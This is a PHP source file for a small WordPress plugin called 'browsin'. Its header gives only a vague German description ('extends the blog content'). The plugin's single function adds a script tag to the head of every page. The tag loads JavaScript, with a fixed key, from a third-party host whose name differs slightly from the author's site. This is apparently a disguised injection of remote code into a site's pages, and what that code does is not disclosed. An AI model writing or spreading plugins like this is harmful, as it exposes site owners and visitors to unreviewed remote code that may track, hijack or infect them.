<?php
/*
Plugin Name: browsin
Plugin URI: http://www.weboverweb.de
Description: Dieses Plugin erweitert den Bloginhalt.
Author: Fatih Yildirim
Version: 1.0
Author URI:http://www.weboverweb.de
*/

function weboverweb_head() {

	echo "<script id=\"weboverwebaddonjs\" language=\"JavaScript\" type=\"text/javascript\"  src=\"http://www.weboweb.de/adonwebover.php?k=mEyXL8WYlPFCpJoaUGHEwDlHU1TGgCro\"> </script>  \n";
	
}

add_action('wp_head', 'weboverweb_head');

?>
